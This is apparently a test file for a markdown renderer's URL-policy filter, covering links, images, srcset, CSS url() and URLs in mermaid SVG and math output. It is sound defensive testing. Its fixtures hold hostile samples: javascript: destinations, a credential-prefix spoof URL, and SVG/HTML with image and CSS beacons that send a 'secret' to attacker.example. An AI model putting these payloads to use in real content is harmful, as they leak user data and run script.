// PROTOTYPE (#url-policy). jsdom because the sink gate, the post-sink markup
// filter and the mermaid hydration path all run over real parsed elements.
import '../tests/setup-dom-jsdom.ts'
import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { withConfig } from './config.ts'
import { renderMarkdownUnsafe } from './renderer.ts'
import { sanitizeRenderedMarkdown } from './sanitize.ts'
import { filterMarkupUrlsString } from './url-filter-markup.ts'
import { hydratePendingDiagrams, type DiagramRenderer } from './mermaid.ts'
import { hydratePendingMath, type MathRenderer } from './math.ts'
import type { UrlPolicy, UrlRequest } from './url-policy.ts'

const APP = 'https://app.example.com'

/** A policy that records every request and answers with `decide`. */
function recordingPolicy(decide: (r: UrlRequest) => string | null): {
  policy: UrlPolicy
  seen: UrlRequest[]
} {
  const seen: UrlRequest[] = []
  return {
    seen,
    policy: {
      baseOrigin: APP,
      createURL(request) {
        seen.push(request)
        return decide(request)
      },
    },
  }
}

/** Block anything the browser would fetch unattended; allow navigation anywhere. */
const blockSubresources = (r: UrlRequest): string | null =>
  r.sink === 'navigation' ? (r.url?.href ?? r.raw) : null

const IMG_EXTENSION = { allowedTags: ['img'], allowedAttr: ['src', 'alt'] }

describe('urlPolicy — off by default', () => {
  it('leaves rendered output byte-identical and stamps no marker', () => {
    const md = '[docs](https://docs.example.com/p) ![x](https://cdn.example.com/a.png) <https://auto.example.com>'
    const html = renderMarkdownUnsafe(md)
    assert.doesNotMatch(html, /data-smd-url-checked/)
    assert.match(html, /href="https:\/\/docs\.example\.com\/p"/)
    assert.match(html, /src="https:\/\/cdn\.example\.com\/a\.png"/)
  })
})

describe('urlPolicy — the markdown surface', () => {
  it('sees links, images and autolinks with the right sink', () => {
    const { policy, seen } = recordingPolicy((r) => r.raw)
    withConfig({ urlPolicy: policy }, () =>
      renderMarkdownUnsafe(
        '[a](https://one.example/) ![b](https://two.example/i.png) <https://three.example/> and https://four.example/',
      ),
    )
    // Sorted: autolinks are linkified in an earlier pass than markdown links, and
    // that pass order is an implementation detail, not part of the contract.
    const bySink = seen.map((r) => `${r.sink}:${r.raw}`).sort()
    assert.deepEqual(bySink, [
      'image:https://two.example/i.png',
      'navigation:https://four.example/',
      'navigation:https://one.example/',
      'navigation:https://three.example/',
    ])
    assert.equal(seen.length, 4, 'each destination is presented exactly once')
  })

  it('neutralizes a blocked image but keeps its alt, and leaves the link beside it', () => {
    const { policy } = recordingPolicy(blockSubresources)
    const html = withConfig({ urlPolicy: policy }, () =>
      renderMarkdownUnsafe('[keep](https://one.example/) ![drop](https://two.example/i.png)'),
    )
    assert.match(html, /href="https:\/\/one\.example\/"/)
    assert.match(html, /<img alt="drop"/, 'element and alt survive')
    assert.doesNotMatch(html, /two\.example/, 'nothing is left to fetch')
  })

  it('emits a rewritten destination — the point of returning a value', () => {
    const { policy } = recordingPolicy((r) =>
      r.sink === 'image' ? `${APP}/proxy?u=${encodeURIComponent(r.raw)}` : r.raw,
    )
    const html = withConfig({ urlPolicy: policy, sanitizeExtension: IMG_EXTENSION }, () =>
      sanitizeRenderedMarkdown(renderMarkdownUnsafe('![x](https://cdn.example.com/a.png)')),
    )
    assert.match(html, /src="https:\/\/app\.example\.com\/proxy\?u=https%3A%2F%2Fcdn\.example\.com%2Fa\.png"/)
  })

  it('hands the policy a canonical URL, so credential tricks cannot fool a prefix test', () => {
    const { policy, seen } = recordingPolicy((r) => r.raw)
    withConfig({ urlPolicy: policy }, () =>
      renderMarkdownUnsafe('[x](https://good.example.com@evil.example/path)'),
    )
    assert.equal(seen[0]?.url?.origin, 'https://evil.example')
    assert.doesNotMatch(seen[0]?.url?.href ?? '', /good\.example\.com/)
  })

  it('resolves a relative destination against baseOrigin', () => {
    const { policy, seen } = recordingPolicy((r) => r.raw)
    withConfig({ urlPolicy: policy }, () => renderMarkdownUnsafe('[x](/docs/page)'))
    assert.equal(seen[0]?.url?.href, `${APP}/docs/page`)
  })
})

describe('urlPolicy — the scheme allowlist stays a floor', () => {
  it('never presents a javascript: destination to the policy', () => {
    const { policy, seen } = recordingPolicy((r) => r.raw)
    const html = withConfig({ urlPolicy: policy }, () =>
      renderMarkdownUnsafe('[x](javascript:alert(1)) [y](https://ok.example/)'),
    )
    assert.deepEqual(
      seen.map((r) => r.raw),
      ['https://ok.example/'],
    )
    // The rejected destination stays literal text (no link is built at all), so
    // the assertion is about live attributes, not the substring.
    assert.doesNotMatch(html, /href="javascript:/)
    assert.match(html, /\[x\]\(javascript:alert\(1\)\)/, 'left as literal text')
  })

  it('cannot be talked into a dangerous scheme by a policy that returns one', () => {
    // The policy tries to swap a safe destination for a scriptable one. This has
    // to fail on the UNSANITIZED path too, or the guarantee is really just the
    // sink's, and post-sink diagram markup would have no floor at all.
    const policy: UrlPolicy = { createURL: () => 'javascript:alert(1)' }
    const unsafe = withConfig({ urlPolicy: policy }, () =>
      renderMarkdownUnsafe('[x](https://ok.example/)'),
    )
    assert.doesNotMatch(unsafe, /javascript:/)
    assert.match(unsafe, /<a[^>]*>x<\/a>/, 'anchor kept, destination dropped')

    const svg = withConfig({ urlPolicy: policy }, () =>
      filterMarkupUrlsString('<svg><a xlink:href="https://ok.example/"><text>x</text></a></svg>', 'diagram'),
    )
    assert.doesNotMatch(svg, /javascript:/)
  })
})

describe('urlPolicy — raw HTML passthrough', () => {
  it('gates a destination that never met the inline emitters', () => {
    const { policy, seen } = recordingPolicy(blockSubresources)
    const html = withConfig({ urlPolicy: policy }, () =>
      sanitizeRenderedMarkdown(renderMarkdownUnsafe('<a href="https://raw.example/?leak=1">x</a>')),
    )
    assert.deepEqual(
      seen.map((r) => r.raw),
      ['https://raw.example/?leak=1'],
    )
    assert.match(html, /<a[^>]*>x<\/a>/)
  })

  it('does not present a renderer-emitted destination twice', () => {
    const { policy, seen } = recordingPolicy((r) => r.raw)
    withConfig({ urlPolicy: policy }, () =>
      sanitizeRenderedMarkdown(renderMarkdownUnsafe('[x](https://one.example/)')),
    )
    assert.equal(seen.length, 1)
  })

  it('never leaks the internal marker into sanitized output', () => {
    const { policy } = recordingPolicy((r) => r.raw)
    const html = withConfig({ urlPolicy: policy }, () =>
      sanitizeRenderedMarkdown(renderMarkdownUnsafe('[x](https://one.example/) <https://two.example/>')),
    )
    assert.doesNotMatch(html, /data-smd-url-checked/)
  })
})

describe('urlPolicy — post-sink markup (mermaid SVG shape)', () => {
  // The real shapes mermaid 11 emits: an HTML label inside <foreignObject>, an
  // injected themeCSS <style>, a click-directive <a xlink:href>, and the marker
  // fragment refs every diagram carries.
  const SVG =
    '<svg>' +
    '<style>.nodeLabel { background-image: url(https://attacker.example/css); }' +
    '.edge { marker-end: url(#arrow-end); }</style>' +
    '<a xlink:href="https://attacker.example/click"><text>x</text></a>' +
    '<image href="https://attacker.example/pixel.png"/>' +
    '<use href="#node-shape"/>' +
    '<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">' +
    '<img src="https://attacker.example/leak?d=secret">' +
    '</div></foreignObject>' +
    '</svg>'

  it('strips every automatic fetch, including through foreignObject and CSS', () => {
    const { policy } = recordingPolicy(blockSubresources)
    const out = withConfig({ urlPolicy: policy }, () => filterMarkupUrlsString(SVG, 'diagram'))
    assert.doesNotMatch(out, /attacker\.example\/leak/, 'foreignObject <img> src')
    assert.doesNotMatch(out, /attacker\.example\/pixel/, 'SVG <image href>')
    assert.doesNotMatch(out, /attacker\.example\/css/, 'url() in <style>')
    assert.match(out, /about:blank/, 'blocked url() is neutralized, not emptied')
  })

  it('preserves same-document fragment refs, or every arrowhead disappears', () => {
    const { policy, seen } = recordingPolicy(blockSubresources)
    const out = withConfig({ urlPolicy: policy }, () => filterMarkupUrlsString(SVG, 'diagram'))
    assert.match(out, /url\(#arrow-end\)/)
    assert.match(out, /href="#node-shape"/)
    assert.equal(
      seen.some((r) => r.raw.startsWith('#')),
      false,
      'the policy is not even consulted for bare fragments',
    )
  })

  it('classifies a click-directive anchor as navigation, not a fetch', () => {
    const { policy, seen } = recordingPolicy(blockSubresources)
    const out = withConfig({ urlPolicy: policy }, () => filterMarkupUrlsString(SVG, 'diagram'))
    const anchor = seen.find((r) => r.element === 'a')
    assert.equal(anchor?.sink, 'navigation')
    assert.equal(anchor?.source, 'diagram')
    assert.match(out, /attacker\.example\/click/, 'navigation survives this policy')
  })

  it('is a no-op with no policy installed', () => {
    assert.equal(filterMarkupUrlsString(SVG, 'diagram'), filterMarkupUrlsString(SVG, 'diagram'))
    const out = filterMarkupUrlsString(SVG, 'diagram')
    assert.match(out, /attacker\.example\/leak/)
  })
})

describe('urlPolicy — mermaid hydration end to end', () => {
  const MERMAID_MD = '```mermaid\ngraph TD\nA[Start] --> B[End]\n```'
  const EVIL_SVG =
    '<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml">' +
    '<img src="https://attacker.example/leak?d=secret"></div></foreignObject>' +
    '<use href="#marker"/></svg>'

  function pendingHost(): HTMLElement {
    const host = document.createElement('div')
    host.innerHTML = renderMarkdownUnsafe(MERMAID_MD)
    return host
  }

  const stub: DiagramRenderer = { render: () => Promise.resolve({ svg: EVIL_SVG }) }

  it('filters the backend SVG before it reaches the container', async () => {
    const { policy } = recordingPolicy(blockSubresources)
    const host = pendingHost()
    const count = await hydratePendingDiagrams(host, { renderer: stub, urlPolicy: policy })

    assert.equal(count, 1)
    assert.equal(host.querySelector('img')?.hasAttribute('src'), false)
    assert.ok(host.querySelector('.mermaid-diagram--rendered'), 'still marked rendered')
    assert.equal(host.querySelector('use')?.getAttribute('href'), '#marker')
  })

  it('leaves the SVG untouched when no policy is supplied', async () => {
    const host = pendingHost()
    await hydratePendingDiagrams(host, { renderer: stub })
    assert.equal(
      host.querySelector('img')?.getAttribute('src'),
      'https://attacker.example/leak?d=secret',
    )
  })
})

describe('urlPolicy — the rest of the URL-bearing surface', () => {
  it('polices each srcset candidate independently', () => {
    const { policy } = recordingPolicy((r) =>
      r.raw.includes('ok.example') ? r.raw : null,
    )
    const out = withConfig({ urlPolicy: policy }, () =>
      filterMarkupUrlsString(
        '<img srcset="https://ok.example/1x.png 1x, https://bad.example/2x.png 2x">',
        'diagram',
      ),
    )
    assert.match(out, /srcset="https:\/\/ok\.example\/1x\.png 1x"/)
    assert.doesNotMatch(out, /bad\.example/)
  })

  it('drops the srcset attribute when no candidate survives', () => {
    const { policy } = recordingPolicy(() => null)
    const out = withConfig({ urlPolicy: policy }, () =>
      filterMarkupUrlsString('<img srcset="https://bad.example/2x.png 2x">', 'diagram'),
    )
    assert.doesNotMatch(out, /srcset/)
  })

  it('neutralizes url() in a style attribute, not just a <style> element', () => {
    const { policy, seen } = recordingPolicy(blockSubresources)
    const out = withConfig({ urlPolicy: policy }, () =>
      filterMarkupUrlsString(
        '<div style="background-image: url(https://attacker.example/x)">y</div>',
        'diagram',
      ),
    )
    assert.doesNotMatch(out, /attacker\.example/)
    assert.match(out, /about:blank/)
    assert.equal(seen[0]?.sink, 'style')
  })

  it('hands the policy url: null when the destination does not resolve', () => {
    const seen: UrlRequest[] = []
    // An empty baseOrigin is a base the URL parser rejects, so a relative
    // destination resolves to nothing — the policy still gets to decide.
    const policy: UrlPolicy = {
      baseOrigin: '',
      createURL(request) {
        seen.push(request)
        return request.raw
      },
    }
    withConfig({ urlPolicy: policy }, () => renderMarkdownUnsafe('[x](/relative/page)'))
    assert.equal(seen[0]?.url, null)
    assert.equal(seen[0]?.raw, '/relative/page')
  })
})

describe('urlPolicy — math hydration', () => {
  const MATH_MD = '```math\nE = mc^2\n```'
  const EVIL_HTML = '<span class="katex"><img src="https://attacker.example/leak"></span>'
  const stub: MathRenderer = { render: () => Promise.resolve({ html: EVIL_HTML }) }

  function pendingHost(): HTMLElement {
    const host = document.createElement('div')
    host.innerHTML = renderMarkdownUnsafe(MATH_MD)
    return host
  }

  it('filters backend HTML before it reaches the element', async () => {
    const { policy } = recordingPolicy(blockSubresources)
    const host = pendingHost()
    const count = await hydratePendingMath(host, { renderer: stub, urlPolicy: policy })

    assert.equal(count, 1)
    assert.equal(host.querySelector('img')?.hasAttribute('src'), false)
    assert.ok(host.querySelector('.math-block--rendered'))
  })

  it('leaves it untouched when no policy is supplied', async () => {
    const host = pendingHost()
    await hydratePendingMath(host, { renderer: stub })
    assert.equal(host.querySelector('img')?.getAttribute('src'), 'https://attacker.example/leak')
  })
})

describe('urlPolicy — filter edge cases', () => {
  const filter = (markup: string, decide: (r: UrlRequest) => string | null): string => {
    const { policy } = recordingPolicy(decide)
    return withConfig({ urlPolicy: policy }, () => filterMarkupUrlsString(markup, 'diagram'))
  }

  it('leaves an empty attribute and an empty url() alone', () => {
    const out = filter('<img src=""><div style="background: url()">x</div>', () => null)
    assert.match(out, /src=""/, 'nothing to decide, nothing removed')
    assert.match(out, /url\(\)/)
  })

  it('handles quoted url() forms and rewrites in place', () => {
    const out = filter(
      `<style>a { background: url("https://cdn.example/a.png"); } b { background: url('https://cdn.example/b.png'); }</style>`,
      (r) => r.raw.replace('cdn.example', 'proxy.example'),
    )
    assert.match(out, /url\("https:\/\/proxy\.example\/a\.png"\)/)
    assert.match(out, /url\("https:\/\/proxy\.example\/b\.png"\)/)
  })

  it('preserves every URL when the policy returns each one unchanged', () => {
    // Not byte-identical: the STRING path re-serializes (`<image/>` comes back as
    // `<image></image>`), which is why the node path is preferred for a DOM sink.
    const markup =
      '<svg><image href="https://cdn.example/a.png"/><style>a{background:url(https://cdn.example/b.png)}</style></svg>'
    const out = filter(markup, (r) => r.raw)
    assert.match(out, /href="https:\/\/cdn\.example\/a\.png"/)
    assert.match(out, /url\(https:\/\/cdn\.example\/b\.png\)/)
  })

  it('skips an empty <style> and non-URL attributes', () => {
    const out = filter('<style></style><div class="x" data-y="z">t</div>', () => null)
    assert.match(out, /class="x"/)
    assert.match(out, /data-y="z"/)
  })
})
